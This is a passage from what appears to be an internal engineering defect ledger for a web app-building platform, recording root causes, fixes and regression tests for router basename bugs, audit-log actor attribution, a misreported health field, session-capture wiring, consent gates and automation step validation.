     `baseForType` never returns it), which is why it has not burned a user; still a landmine.
  3. **`app-integration-heavy` is a base in name only** (no scaffold, no wiring; degrades
     gracefully to generic starters + prompt sections). Same unreachability.
     Disposition for 2+3: fold both into the `app` base (delete, or give them real scaffolds)
     the next time base selection grows a second app flavour; until then they stay as prompt-only
     variants reachable only by explicit `templateId`.
  4. **`manifest.extends` is never validated against `BASE_IDS` on the import path**
     (`manifest.ts` accepts any non-empty string); an arbitrary value silently resolves to `null`
     base at `build-mechanics.ts resolveFollowUp`, i.e. base conventions vanish from follow-up
     builds with no signal. Needs a warn-or-fail decision at import time.

- **`landing-presentation-scaffold-zero-coverage`** (2026-08-09, FIXED same day). The `landing`
  and `presentation` scaffolds had no test reading them at all - a syntax error would ship
  silently and surface only as a live build failure. Fixed by the scaffold compile guard in
  `api/tests/apps/base-loader.test.ts` ("every scaffold-carrying base compiles through the real
  builder"): each base with a `scaffold/` is assembled via `baseProjectFiles` and bundled through
  the real `appBuilder` esbuild pipeline; the covered set is pinned to
  `app/document/landing/presentation` so a base gaining or losing its scaffold is a deliberate
  diff.

- **`featured-router-basename-missing`** (all 4 known instances FIXED 2026-08-08, MEDIUM, plus a
  standing regression guard added for the whole class - found chasing two "real broken state, not
  just empty data" screenshots the WS10 featured-artifact audit flagged: `booking-system` rendered
  a fully blank content pane (sidebar visible, body white); `sales-crm` rendered a "Página não
  encontrada" 404 instead of its dashboard). Reproduced from CURRENT source, not a stale
  screenshot ghost: built each scaffold with the real `appBuilder.build()` esbuild pipeline and
  served the dist under `/apps/<id>/` (the exact path prefix `serving.ts` mounts every artifact
  at), byte-identical `injectAppContext()` included. Both reproduced exactly as screenshotted;
  Playwright's console capture on `booking-system` even printed react-router's own diagnostic
  verbatim: `No routes matched location "/apps/booking-system/"`.
  ROOT CAUSE, systemic in the sense that it recurs (a scaffold-authoring omission, not a bug in
  the builder/serving/route-mounting layer itself - proven by the 29 `legal-*` scaffolds + `cobrancas`
  that all serve correctly through the exact same pipeline): every served artifact lives at
  `/apps/<id>/`, so `window.location.pathname` there is `/apps/<id>/...`, never bare `/`. A
  scaffold that mounts `<BrowserRouter>` with NO `basename` declares routes as absolute paths from
  the domain root (`/`, `/calendario`, `/contactos`, …) which then never match the actual served
  pathname. `injected-context.ts` even documents the trap inline (the `<base href>` comment: "react
  router uses its basename, not the DOM base") - the platform's own `<base>` tag fixes RELATIVE
  ASSET urls but does nothing for react-router's path matching, which reads
  `window.location.pathname` directly. The symptoms are the SAME defect wearing different costumes
  depending on whether the scaffold's own route table happens to declare a catch-all:
  `booking-system` has none, so `<Routes>` matched nothing and rendered `null` (blank content
  pane, sidebar chrome unaffected since `Shell` renders unconditionally around `{children}`);
  `sales-crm` has an explicit `<Route path="*" element={<NotFound/>}>`, so the mismatch rendered
  its own "Página não encontrada" empty-state instead of the dashboard; `ecommerce-catalog` and
  `invoice-manager` both redirect to `/` on an unmatched path (`<Route path="*" element={<Navigate
  to="/" replace/>}>`), which - THIS IS THE THIRD COSTUME, found while writing the regression
  guard below - does not print "no routes matched" at all: react-router instead warns `<Router
  basename="..."> is not able to match the URL "..." because it does not start with the basename,
  so the <Router> won't render anything`, a DIFFERENT diagnostic for the sub-case where the
  (defaulted) basename isn't even a prefix of the served path. Three symptom shapes, one cause.
  BLAST RADIUS: exactly 4 of the 42 featured artifacts omitted `basename` on `BrowserRouter`
  (grepped every scaffold: 33 declare a top-level Router, 29 of those - every `legal-*` +
  `cobrancas` - already derived and passed `basename` correctly). All 4 are now fixed.
  `ecommerce-catalog` and `invoice-manager` are Stage A DEMOTE dispositions
  (`docs/featured-artifacts-ledger.md`) - fixed anyway, on explicit instruction, because the
  operator had not yet approved any demotion and both were live, broken, featured artifacts in
  the meantime; a pending disposition decision is not a reason to ship known-broken apps.
  FIX (all four): mount the router with `basename` derived from `window.location.pathname` at
  render time - the exact pattern every `legal-*` scaffold's `index.jsx` already carries:
  `window.location.pathname.match(/^(\/apps\/[^/]+)/)`, falling back to `/` when unmatched
  (SSR/tests/`file://`). No platform code changed - the serving pipeline, `injectAppContext`, and
  every other scaffold using the convention correctly were already fine; this is a four-file
  scaffold-content fix.
  CLASS GUARD (the more durable half - built per explicit follow-up instruction, not left as a
  recommendation): `api/tests/apps/featured-router-catalog-guard.test.ts`. Deliberately
  BEHAVIORAL, not a source-text pattern match - the actual invariant is "does the built artifact
  render its routed content when served at `/apps/<id>/`", not "does the source look like the
  fix", and a text pattern cannot honestly stand in for that (it would reject the equally-correct
  `window.__EKOA_APP_ID`-based derivation, and it would ACCEPT a dynamic-looking-but-wrong
  derivation - proven below, not asserted). The guard builds each scaffold with the real
  `appBuilder.build()`, serves it under its real `/apps/<id>/` prefix with the real
  `injectAppContext()`, and asks a real (Playwright-launched) browser whether react-router ever
  emitted either of its two "won't render" diagnostics (see the finding's own root-cause
  paragraph above - discovering the second diagnostic mid-build IS the proof the naive
  single-pattern version would have been wrong). A "guard correctness" sub-suite runs the check
  against six synthetic fixtures first: FAILS on no-basename (the original bug), FAILS on a
  hardcoded literal basename, FAILS on a basename that is dynamically COMPUTED but WRONG (the
  fixture that caught the missing second diagnostic - first attempt at this exact case falsely
  PASSED before the fix), PASSES on the shipped `window.location.pathname` derivation, PASSES on
  a deliberately DIFFERENT correct derivation (`window.__EKOA_APP_ID`-based) proving the guard
  does not merely pattern-match this incident's specific fix, and PASSES on a `HashRouter` with no
  basename at all. HashRouter/MemoryRouter DECISION: both pass by construction, not
  special-cased - HashRouter resolves from `window.location.hash`, entirely independent of the
  served path prefix; MemoryRouter never reads the browser URL at all. The guard only builds
  scaffolds that source-declare `BrowserRouter` (a coarse scoping scan, never the pass/fail
  verdict itself) - 33 of 42 today. A "census against the real catalog" test then runs the same
  behavioral check against all 33 real scaffolds and asserts zero failures, with a failure message
  that names the artifact, states the `/apps/<id>/` prefix rule, and shows the one-line fix -
  written for a 2am reader with no context, per the ask. Currently green (0/33 failing).
  KNOWN FRAGILITY, named rather than hidden: the guard's failure detection is coupled to
  react-router's current diagnostic wording (both exact strings, matched by regex) - a
  react-router upgrade that changes either message needs a companion update here. This is the
  honest cost of a behavioral check over library internals; the mitigation is catching both known
  variants instead of the one this defect happened to hit first.
  SUITE_LEDGER.json: deliberately NOT registered there. `scripts/suite-ledger-run.mjs` strict
  count-censuses three categories only - `web/e2e/*.spec.ts`, `api/tests/e2e/*.e2e.mjs` drivers,
  and `web/__tests__` frontend unit files (its own header: "this runner censuses the
  externally-authored estate... `module_tests_146` runs via plain `npm test`, not this runner").
  This is none of those three; it is a new `api/tests/apps/*.test.ts` vitest module test, which
  the ledger's design deliberately does not count-census (`module_tests_146`/
  `contract_tests_from_ruleset` track the historical migration carryover, not an ongoing inventory
  of every current test file). It runs, and is gated, the same way every other
  `api/tests/apps/*.test.ts` file is - `npm test --workspace api`, step 3 of the per-PR CI lane.
  RECOMMENDATION STILL OPEN: a line in the scaffold-authoring guidance under `api/assets/bases/`
  (so the NEXT scaffold is written correctly rather than merely caught by the guard) - not added
  here; that directory is owned by another in-flight workstream and needs sequencing first.
  Tests: the class guard above (7 tests: 6 synthetic-fixture guard-correctness + 1 real-catalog
  census, all green) supersedes an earlier, narrower `featured-router-basename.test.ts` (a static
  source-text pin covering only booking-system + sales-crm, since removed - the behavioral guard's
  real-catalog census covers the same two apps at strictly higher fidelity, so keeping both would
  have meant maintaining two tests of different rigor for one invariant). Evidence for the
  render-level behavior (react-router's own diagnostics before, the full page content after) is a
  set of Playwright screenshots/console transcripts per artifact taken during diagnosis, not
  checked in as test assets - the class guard is the durable regression gate; the visual proof was
  for diagnosing THIS incident, not a permanent fixture.

- **`registo-anon-audit-actor-blank`** (FIXED 2026-08-08, HIGH, empirically confirmed against the
  live dev DB - 175 of 256 `activity_logs` rows failing validation - found chasing the dashboard's
  "Response for GET /api/v1/registo failed contract validation"). The anonymisation-audit write
  (`llm/anonymise/audit.ts`) recorded `userId: actor.userId ?? ''` / `username: ... ?? ''` /
  `orgId: actor.orgId ?? ''`. `registoEntry()` (`services/platform-crud.ts`) maps
  `actor: a.userId`, and the shared `RegistoEntry.actor` is `Id = z.string().min(1)` - so every row
  with a blank `userId` failed `RegistoListResponse` validation for any reader (`web/lib/api/core.ts`
  contract check). Only a super-admin ever saw it (its `readRegisto` query is unscoped `find({})`;
  an org-admin's is `{orgId: actor.orgId}`, which a blank `orgId` never matches), which is why the
  defect went unnoticed until a super-admin opened the dashboard.
  ROOT CAUSE, traced past the obvious `ctx.actor ?? {}` fallback in `anonymise/index.ts` (that
  fallback's own call sites - `runAgent`/`runOneShot`/`completeFast` via `anonContextFor` - already
  stamp a real actor from the required `LlmAttribution.billeeUserId`, so it was live-but-idle
  defensive code, not the volume source): the REAL source is `llm/client.ts`
  `proxyGatewayMessages`/`proxyGatewayCountTokens`, called from `llm/gateway.ts` with
  `billeeOf(principal)` for the STATIC gateway-key principal (`kind: 'apikey'`) - the credential
  EVERY Agent SDK subprocess presents (`credentials.ts` `buildSubprocessEnv`,
  `env.ANTHROPIC_API_KEY = cfg.llm.gatewayApiKey`) when it calls back into this same chokepoint
  over `ANTHROPIC_BASE_URL` for every turn of its own agentic tool loop. That HTTP boundary
  genuinely carries no per-request user identity - the static key is shared by every subprocess
  regardless of which user's run spawned it - so `billeeUserId` is `''`, and a single chat/build
  turn's subprocess makes many such calls (one per tool-loop turn), which is why this dominated the
  ratio: metering already drew this exact distinction (`kind: 'platform'`, `pi-fast-loop`,
  "platform overhead billed to the platform admin") but the anon-audit actor did not.
  The bridge path (`bridge/provider.ts` -> `proxyGatewayMessages(reqBody, pairing.ownerUserId, ...)`)
  was never affected - it always carries a real principal, the pairing owner.
  FIX, three parts. (1) PRIMARY: `proxyGatewayMessages`/`proxyGatewayCountTokens` now omit `actor`
  entirely when `billeeUserId` is empty, instead of stamping empty-string fields - an honest "no
  principal here" rather than a shape that looks like a real-but-blank identity. Every OTHER call
  site already had a real principal to propagate (see above); minting a per-run scoped gateway key
  so the static-key path could carry one too is a materially larger change (key issuance/lookup
  lifecycle) and is out of scope here - reported honestly rather than half-done. (2) BELT:
  `audit.ts`'s default sink now falls back to the `'system'` sentinel - `actor.userId || 'system'`
  (matching the `server.ts:767` content-loader-audit precedent). Deliberately `||`, not `??`:
  `actor.userId` can already BE an empty string (not `undefined`) at the gateway call sites above,
  which `??` would not replace. (3) BONUS (same PR): `routes/registo.ts` forwarded
  `userId`/`type`/`orgId`/`limit`/`offset` but silently dropped `from`/`to`, which
  `RegistoQuery` (`shared/src/registo.ts`) declares and the UI's date filters
  (`web/stores/registo.ts`) send; `readRegisto` had no date filter either. Wired both through
  (`platform-crud.ts` filters `activityLogs` rows by ISO-8601 string comparison against
  `timestamp`).
  (4) MITIGATION (same PR, added after review): the fix makes these rows RENDER instead of
  breaking the page, and `category: 'anonymisation'` already made up >=68% of the WHOLE
  `activity_logs` collection before this fix (the 175 blank rows were ALL of them - every other
  category's `audit()` helper refuses to write without a real actor) - so a super-admin's
  UNSCOPED "all offices" view would now show mostly `'system'` rows drowning out
  human-attributable ones, growing with usage. Every org-scoped view (every org-admin, and a
  super-admin who picks one office) was never affected either way - `orgId` never matches a real
  org for these rows, blank or `'system'`. `readRegisto` now hides `category: 'anonymisation'` by
  default UNLESS an explicit `type` filter or `includeAnonymisation=true` is given
  (`RegistoQuery.includeAnonymisation`, documented on the wire and in the handler) - and this is a
  VISIBLE default, never a silent one: `web/app/(dashboard)/registo/page.tsx` shows a permanent
  notice stating the rows are hidden by default, with a one-click `Switch` to include them
  (`web/stores/registo.ts` `setIncludeAnonymisation`, auto-refetches).
  Tests: `api/tests/contract/registo.test.ts` (new `describe` blocks) drive the REAL audit path -
  `proxyGatewayMessages(body, '')` - and assert the persisted row and the `GET /api/v1/registo`
  response both carry `'system'`, validate against `RegistoEntry`/`RegistoListResponse`, that an
  org-admin never sees the system-attributed row, that `from`/`to` narrow the result set, that the
  mask row is absent by default and present with `includeAnonymisation=true`, and that an explicit
  `type` filter always wins. `api/tests/llm/anonymise-chokepoint.test.ts` adds the matching
  unit-level sentinel case against the real Mongo-backed default sink. Every lookup lands on the
  exact row via its OWN `metadata.correlationId` (never a coarse `{category:'anonymisation'}` /
  `{userId:'system'}` query) - this file's own build-job tests, and other `proxyGatewayMessages`
  calls elsewhere in the suite, write the SAME category through the SAME fire-and-forget path
  (`audit.ts`), and a coarse query caught one such straggler mid-review. All pre-existing
  anonymise/gateway/registo suites still pass unmodified. The web-side toggle/banner has no
  dedicated automated test (this page had zero web-layer test coverage before this change either);
  the filtering logic itself is fully covered server-side.

- **`change-password-escape-control-drill-asserted-forced-on-default`** (DISMISSED - not a product
  defect - 2026-08-07, found by the drill batch fixer on `change-password#escape-control-present`).
  The drill reported the forced-change escape control ("Terminar sessão") as absent. It was absent
  because the run had landed on the OPTIONAL variant of `/change-password`, where the correct escape
  control is "Voltar ao Dashboard" - and it was present. The product code is correct and already
  variant-aware (`web/app/change-password/page.tsx`): `passwordChangeRequired` renders the sign-out
  control in the forced variant and the back-to-dashboard link in the optional one, exactly one of
  which is always on the page. The real fault was in the drill: the `escape-control-present` step
  asserted the forced control on `state: default`, but the default landing is only forced on a fresh
  stack where the seeded admin still owes the first-login change; once that change has been completed
  the default page is the optional variant. FIX: drive that step through the `forced` state (its
  reachPath signs in as an account owing the change) instead of relying on the default landing; the
  optional case stays covered by `back-link-present`. No product change.

- **`health-reported-the-SSE-count-as-bridgeConnections`** (FIXED 2026-08-07, MEDIUM, an
  observability field that lied in both directions - found while pairing a real daemon and not
  believing the number). `/health` answered `bridgeConnections: sseManager.connectionCount`
  (`api/src/server.ts:914`) - the browser SSE client count. So the field read 1 with a dashboard tab
  open and no daemon anywhere, and 0 with a daemon genuinely connected and reporting
  `Estado da ligação: open`. Both directions wrong at once, which is what made it convincing: it
  moved when things happened, just never for the reason the name claimed.
  `bridge/registry.ts:306` already exports `bridgeConnectionCount()` (`live.size`) whose docblock
  names it as THIS FIELD'S source - "reported separately from SSE `connections`" - and nothing
  called it. Fixed by calling it. Verified live end to end: a MacBook Air paired over tailscale
  (`goncalos-macbook-air.local-6ad045e2`), `ekoa-bridge serve` reconnected by itself across an api
  restart, and `/health` went 0 -> 1 with no SSE client attached.
  WHY IT MATTERED HERE beyond a wrong number: this field is the readiness signal for the attended
  ceremony rail (a ceremony REFUSES when no machine is live), so "is a machine connected?" was
  being answered by "is a browser tab open?". Anyone diagnosing a failed ceremony would have been
  reading noise.

- **`the-attended-session-ceremony-was-built-tested-and-unreachable`** (FIXED 2026-08-06, MEDIUM,
  a complete rail with no ignition - found while answering "how else could an agent authenticate to
  a site" rather than by a suite). Everything needed to capture a human-established browser session
  existed and passed tests: `requestAttendedCeremony` (`api/src/bridge/attended.ts`) opens a
  ceremony on a named machine and refuses rather than queueing when it is offline; the bridge's
  `session.push` handler (`api/src/bridge/server.ts:306`) already called `acceptSessionPush`, which
  refuses an unknown requestId, a push from the wrong machine and a mismatched origin; and
  `captureSessionToCofre` (`api/src/cofre/sessions.ts`) sealed the result as a Cofre item of type
  `session` under the same envelope, grants and lock-all as a password, origin-bound and TTL'd.
  `api/src/cofre/session-checkout.ts` even decided how an expired one must be re-established
  (`typist` vs `attended`) and whether the egress matches where it was made.
  NOTHING IN `api/src` CALLED THE FIRST FUNCTION. Only its own test did. So the daemon-to-Cortex
  direction was live while the Cortex-to-daemon direction had no caller, and the only reachable
  surface - `GET`/`POST /api/v1/integrations/:key/session` - answered a hardcoded
  `"Captura de sessão não disponível nesta versão."` for every key. That stub was itself the
  honest half of an earlier finding (the shipped CITIUS asset promised users "O Ekoa captura a
  sessão autenticada (cookies) e guarda-a cifrada" while the route said `available: false`), so the
  product had been truthful about a capability it owned but could not start.
  FIXED by wiring the two existing routes to the existing engine - no new endpoints, no contract
  change (`SessionCaptureStatus` is passthrough and `ConnectSessionResponse` already declared
  `waiting_login`). POST resolves the package's `sessionConnect.loginUrl` as the origin and the
  ACTOR's own live pairing as the machine, then opens the ceremony; GET reports the real state.
  TWO THINGS DELIBERATELY NOT TAKEN FROM THE REQUEST. The machine is resolved from the actor via
  `getConnectionByOwner`, never a caller-supplied `pairingId` - otherwise one user could pop a login
  prompt on another user's screen and bank the resulting session against their own org. The origin
  is the package's declared `loginUrl`, never a client field - that is what makes the session which
  comes back provably the session for the portal we asked about.
  `supported` (a property of the package) and `available` (a property of this moment) are reported
  separately: collapsing them would tell a user with no machine online that the feature does not
  exist, which is the same class of untruth the stub told everyone. `newestUsableSession` skips
  expired and unhealthy rows, so `captured` never describes a session that would fail at checkout.
  BEHAVIOUR CHANGE worth noting: an unknown `:key` on these two routes is now the uniform 404 every
  other `:key` route answers (A2), where the stub returned 200 for any string because it never
  looked the key up. Two contract tests asserted that blind 200 and were rewritten.
  Pinned by 6 cases in `api/tests/contract/f5-ui-endpoints.test.ts`, including the live path (a
  connected machine: the frame goes to the actor's pairing, carries `attended.request` and the
  package's origin, and one ceremony is open) and the refusal path (no machine -> `started: false`,
  never queued). Reverted-and-verified: removing the ignition turns the live case red.
  Session material still never crosses the wire - both responses are status metadata only, asserted.
  STILL OPEN, and it is a product decision rather than a defect: the ceremony is machine-targeted by
  design because it exists for credentials that cannot travel (an OA certificate in a keystore, a
  Cartão de Cidadão in a reader). There is no ATTENDED-ANYWHERE route - a human who merely needs to
  pass an SMS/TOTP prompt, with no local credential, still has to be at the paired machine. A
  one-time-link flow that let them complete such a login on a phone would reuse
  `captureSessionToCofre` unchanged; only the handoff is missing.

- **`ekoa-dev-work-can-live-only-on-a-peer-machine`** (FIXED 2026-08-06, MEDIUM, parity mechanism —
  found by the operator saying "check on dev-madrid we definitely made changes" after the audit
  reported clean). `npm run parity:audit` printed `parity:audit OK - ledger current` while four
  commits sat on the operator's other machine, committed and never pushed: the served-app email
  plane, document extraction, the Cobranças featured artifact, and the featured-fork fix. GitHub's
  `ekoa-dev` main was genuinely unchanged since 2026-08-03, and `gh api` confirmed it — the audit
  was not wrong about `origin/main`, it was wrong about what the question meant. An audit that
  answers confidently and uselessly is worse than one that does not exist, because it is believed.
  FIX: `scripts/dev-parity-audit.mjs` now fetches configured PEER checkouts into
  `refs/remotes/parity-peer-<name>/main` and reports commits a peer holds that origin does not as
  UNPUSHED, with a per-peer baseline so dispositioned work stops being re-reported; an unreachable
  peer warns and is named as NOT audited on the success line. Two honesty bugs surfaced while
  testing the fix and were fixed with it: an EMPTY `EKOA_DEV_PEERS` suppressed the ledger's own
  peer config (looking like "not set"), and the OK line listed unreachable peers as audited.
  Pinned by `api/tests/docs/dev-parity-audit.test.ts` (throwaway git repos, incl. the negative
  cases). Related: the same read found that upstream `c4f7f2c6`'s MESSAGE describes three fixes
  while the commit contains one — the other two are uncommitted in that machine's working tree, so
  a commit subject is not evidence of what landed.

- **`ported-app-content-can-describe-the-wrong-platform`** (FIXED 2026-08-06, MEDIUM, ported
  content — found while verifying the Cobranças featured artifact renders, not by reading the
  diff). The app's Definições page told the user, in bold as an "honest note": *"a plataforma não
  aplica qualquer confirmação adicional aos envios"* — the platform applies no extra confirmation
  to sends. That was TRUE of the platform it was written for. It is FALSE here: a send from a
  served app is a WRITE and passes the C2 consent gate, so the first time a user acted on that
  sentence they would hit `awaiting_consent` having just been told the door did not exist.
  Rewritten to state both approvals (the app's own work-queue approval, and the account owner's
  one-time authorisation in Integrações). A second defect in the same import: the app's
  `dados-omissao.test.mjs` resolved `seed-data.json` one directory too shallow, so it threw ENOENT
  instead of asserting — a dead test upstream as well as here. Path fixed; the invariant it guards
  (the auto-seed source and the fork-seed file are the same content) does hold, and now provably.
  This is `docs/governance.md`'s runtime-truth rule earning its place: ported content carries
  CLAIMS about a platform it was not written for, and the claims are the part that rots silently —
  the code fails loudly, the sentence just misleads.

- **`the-chat-empty-state-forked-a-featured-app-into-a-second-copy`** (FIXED 2026-08-06, MEDIUM,
  web — ported from ekoa-dev `c4f7f2c6`, which found it in the old platform). Clicking a featured
  Starting Point on the chat empty state called `api.artifacts.fork`, so "use this" produced a
  SECOND copy of the app in the user's gallery, identical in name, with no way to tell which one
  their subsequent edits went into. `/artifacts` had already been fixed to open the featured app's
  own chat via `?continue=` (`handleCustomizeFeatured`), so the two surfaces disagreed about what
  the same action meant. FIX: `web/components/chat/chat-stripes.tsx` opens the running featured app
  in a new tab and routes the current tab to `/chat?continue=<featured.id>`; the backend
  materialises a working copy on the first real modification, keeping id, slug and data.
  `web/lib/featured-fork.ts` is deleted (it had exactly one consumer). Regression:
  `web/__tests__/components/chat-stripes-featured.test.tsx`, whose load-bearing assertion is
  NEGATIVE — `fork` is never called — because asserting only the navigation would still pass with a
  fork firing alongside it, which is exactly the shape the bug had. The upstream commit's other
  half (follow-up detection requiring `projectPath`) is NOT-NEEDED here: ekoa-code already keys a
  follow-up on the artifact id alone and never sends a client-side project dir.

- **`the-capability-surface-listed-google-workspace-and-could-never-execute-it`** (FIXED 2026-08-06,
  HIGH, public capability surface — found by driving the Garrison consumer to a REAL connected
  Google account rather than to a fixture). `POST /api/v1/integrations/:key/actions/:name/execute`
  answered `{"success": false, "code": "not_connected"}` for `google-workspace` on an org whose
  OAuth connection was live, enabled and refreshing — `GET /api/v1/platform-integrations/google`
  reported `connected: true` with the account email, and the stored row
  (`platform-<orgId>-google`) carried valid credentials the whole time.
  CAUSE: custody, not connection. `executeIntegrationCapabilityAction` called
  `executeUserIntegrationAction` and, by design, nothing else — that funnel resolves a PER-USER
  `integrationConfigs` row (`findConfigForOwner`) and there is none for a platform package, so it
  returned the coded refusal from `action-executor.ts:298`. The two shipped platform packages keep
  their tokens on an ORG-scoped row only `callPlatformIntegration` can read, and that function was
  wired into the composition root for the automation `integration` step and the trigger pipeline
  and NEVER onto the capability rail. `action-executor.ts:18-19` states the split plainly ("the
  function the automation engine's `integration` step calls for a NON-platform key … OAuth2/
  service_account are platform-only"); the capability route simply had no platform branch.
  So `GET /api/v1/integrations` listed `google-workspace` with all 24 actions, `GET
  /integrations/google-workspace` described them, the write gate correctly refused the mutating
  ones with a resolved destination — and not one of the 24 could ever run. The catalog advertised a
  rail that did not exist. Every existing case in
  `api/tests/integrations/integration-capability.test.ts` used a user-credential package, which is
  why nothing caught it; the contract suite probes admission, not custody.
  FIXED with a `callPlatform` SEAM on `CapabilityContext`, bound once in `server.ts` exactly like
  the existing `runAutomationBackedAction` and `draftAction` seams, and a custody dispatch in
  `executeIntegrationCapabilityAction` keyed on the new exported `isPlatformIntegrationKey`
  (platform-call.ts). The org comes from the verified principal and the acting user is forwarded so
  the platform write gate has an approval to look up.
  THE GATE DID NOT MOVE, which is the only reason the branch is allowed: `callPlatformIntegration`
  enforces its own gate over the same `action-consent.ts` primitives, in the one function every
  platform rail calls, and a mutating platform action with no live approval still answers
  `awaiting_consent` and still cannot be approved with a key (the approval route is `auth: 'user'`).
  A DIRECT import of the caller is refused by the static guard — the branch must go through the
  injected seam or the module regains its own credential path outside the composition root's
  control. With NO seam bound it fails closed rather than falling through to another custody.
  Pinned by three cases in `api/tests/integrations/integration-capability.test.ts` (the seam is
  used with the right tenancy; the static guard; fail-closed with no seam), reverted-and-verified
  red on two of them. VERIFIED LIVE end to end afterwards: `list_files` through the Garrison
  consumer returned 100 real Drive files, and `send_email_simple` still answered 403
  `awaiting_consent` naming `POST https://gmail.googleapis.com/gmail/v1/users/me/messages/send`.
  `api/tests/security` + `api/tests/contract` + `api/tests/integrations` are 1750/1750 green.
  RESIDUAL, FOUND AND CLOSED THE SAME DAY: the fix above moved the WRITE to platform custody and
  left the READ behind, so `getIntegrationCapability` still derived `connected` from the per-user
  config row (`config ? config.enabled !== false : def.authType === 'none'`) and reported
  `connected: false` for a live Google account whose actions now executed fine - the UI rendered
  "connected: false - actions will answer not_connected" directly above a successful call. That is
  the same D3 read/write disagreement this module's docblock already complains about, with the read
  the pessimistic one this time. Closed with a `platformConnected` seam bound from `platformStatus`
  (no token spent), pinned by a case asserting the catalog answers from the platform custody.

- **`a-parked-run-asked-a-question-no-external-client-could-read`** (FIXED 2026-08-06, MEDIUM,
  public capability surface / an endpoint whose auth class invites a caller who cannot use it -
  found while driving the Garrison consumer through the public surface end to end). A run that
  halts at `awaiting_consent` is answered with `POST /api/v1/automations/runs/:id/consent`, whose
  descriptor is `auth: 'user-or-key'` (`shared/src/automations.ts`, `consent`) and whose body
  REQUIRES `shape` (`ConsentRequest`, same file). The service refuses any shape other than the one
  the run is actually awaiting - deliberately, and that refusal is itself a security fix already
  recorded here (`consent-approval-scope-mismatch`, plus the "bank an approval for a shape the user
  was never shown" case pinned in `api/tests/automation/service.test.ts`). So the ONLY shape that
  works is the pending one, and the only carrier of it was the SSE `runAwaitingConsent` event
  (`api/src/automation/engine.ts:769`). There is no event stream on the key-reachable surface -
  `docs/openapi/cortex.v1.json` is generated from the `user-or-key` descriptors and contains none.
  `toWireRun` (`api/src/automation/service.ts`) projected `status` and never `consentRequest`.
  Net effect: a gateway key could read `status: "awaiting_consent"`, could not learn what was being
  asked, could not learn the shape, and therefore could not call the endpoint its own auth class
  invited it to call. The run was answerable only from a browser holding a live SSE subscription.
  This is the same gap the OPEN entry `no-wire-event-can-carry-a-pause-reason` names from the event
  side; this is its polling-side half, and unlike that one it is closable without a new event type.
  FIXED by publishing the pending question on the run record: `RunRecord.consentRequest`
  (`shared/src/automations.ts`, new `RunConsentRequest`) carries `{stepIndex, description, shape}`,
  `toWireRun` projects exactly those three, and `docs/openapi/cortex.v1.json` was regenerated
  (`api/scripts/generate-openapi.mjs`) so the drift gate stays green. ADDITIVE, so rule 7 applies:
  a new optional field on a `.passthrough()` schema; no existing response changed.
  THREE fields, not more: `argv` is the raw command line, which the engine shows a human only behind
  an explicit "what exactly will run?" toggle (`automation/types.ts:572`), and `approvalScope` is
  server-written bookkeeping its own type marks as never caller-supplied (`types.ts:586`). Neither
  becomes public as a side effect of making the gate answerable. Publishing the shape gives an
  attacker nothing the refusal above did not already constrain: `resolveConsent` still binds the
  answer to the run's own pending shape, and a caller who cannot read the run cannot read the shape.
  Pinned by `api/tests/automation/service.test.ts` - a case that reaches `awaiting_consent`, asserts
  the three fields (and the ABSENCE of `argv`/`approvalScope`), answers using ONLY the value the
  wire record published, and asserts the field is cleared once the run resumes so a finished run
  never advertises a stale question. Reverted-and-verified: with the projection removed the case
  fails on `expected undefined to match object`. `api/tests/contract` + `api/tests/automation` are
  844/844 green with it.
  NOT CLOSED BY THIS: the integration write gate on a DIRECT
  `POST /integrations/:key/actions/:name/execute` remains unanswerable by a key, and correctly so -
  it returns 403 with the `consentRequest` descriptor inline, but the approval endpoint
  (`POST /api/v1/integrations/:key/actions/:actionName/approval`) is `auth: 'user'` and off the
  key-reachable surface, so the approving human is a human by construction. Verified live against a
  real minted key: `send_email_simple` answers 403 `awaiting_consent` naming the RESOLVED target
  `POST https://gmail.googleapis.com/gmail/v1/users/me/messages/send` (no `{{placeholder}}` -
  independent live confirmation that `consent-target-shows-an-uninterpolated-template-and-config-can-redirect-it`
  is fixed), and the gate fires BEFORE the not-connected check, so it answers before a credential is
  touched.

- **`automations-create-dropped-every-step-field-it-could-not-carry`** (FIXED 2026-08-06, HIGH,
  public capability surface / contract honesty - the WIDENING half stays OPEN, at the end of this
  entry). `POST /api/v1/automations` and `PATCH /api/v1/automations/:id` are `user-or-key`
  (Capability Contract rule 4), and both stored their `plan.steps[]` through `mapWireStepToEngine`
  (`api/src/automation/service.ts`, was line 69), which built the engine `Step` from `{id,
  description, type}` and DISCARDED every other field on the wire step - while the contract's
  `PlanStep` (`shared/src/automations.ts:22-31`) is `.passthrough()` and therefore advertises the
  opposite. `toWireAutomation` (same file, ~line 74) then projected the stored step back as
  `{stepId, description, tool}`, so a client could not even SEE what had been lost.
  REPRODUCED LIVE against the running stack, with a key: a step
  `{"description":"List Gmail labels","tool":"integration","integrationKey":"google-workspace","integrationAction":"list_labels"}`
  was accepted **HTTP 201** and stored as
  `{"stepId":"step-0-1e98d8","description":"List Gmail labels","tool":"integration"}`; the run then
  died at execution with `integration step step-0-1e98d8 missing integrationKey or
  integrationAction` (`api/src/automation/engine.ts:1379`). The API discarded the fields the client
  had correctly supplied and then blamed the client at run time for their absence. SIX step types
  are in that position, each with its own run-time death: `integration` (integrationKey +
  integrationAction), `navigate` (url, engine.ts:1335), `sub_automation` (subAutomationId,
  engine.ts:1362), `local_command` (commandTemplate.argv,
  `api/src/automation/executors/local-command.ts:76`), `api_call` (apiRequest.method/.url,
  `executors/api-call.ts:155`), `ekoa_action` (ekoaAction.artifactSlug/.capabilityName,
  `executors/ekoa-action.ts:68`). A SECOND defect sat inside the same expression: an unrecognised
  `tool` was coerced to `'browser'` (`VALID_STEP_TYPES.has(s.tool) ? s.tool : 'browser'`), so the
  typo `brwoser` became a running browser step rather than an error.
  FIXED by refusing both at the door rather than storing a step that can only fail later. The
  uncarried parameters are now a named table (`STEP_TYPE_UNCARRIED_PARAMS`, service.ts:93) and the
  types this endpoint CAN express are derived from it, so the two lists cannot drift; a `tool` in the
  table and an unrecognised `tool` each throw `AutomationServiceError('VALIDATION', ...)`, which the
  router already maps onto the 400 `VALIDATION_FAILED` envelope (`routes/automations.ts`
  `sendServiceError` - this is that code's first use). The refusal message names the fields that
  cannot be expressed AND the route that can author them (`POST /api/v1/automations/plan`, then
  `POST /api/v1/automations/{id}/runs`); the claim was verified before it was written, in
  `automation/planner.ts` `normaliseStep` (sets integrationKey/integrationAction/argsTemplate) and
  `service.ts` `planFromGoal`, which persists those engine-native steps verbatim. The mapping is
  hoisted OUT of the `automations.update` callback in `patchAutomation` (service.ts:385) so a refused
  patch leaves the stored plan untouched instead of throwing mid-write, and out of the doc literal in
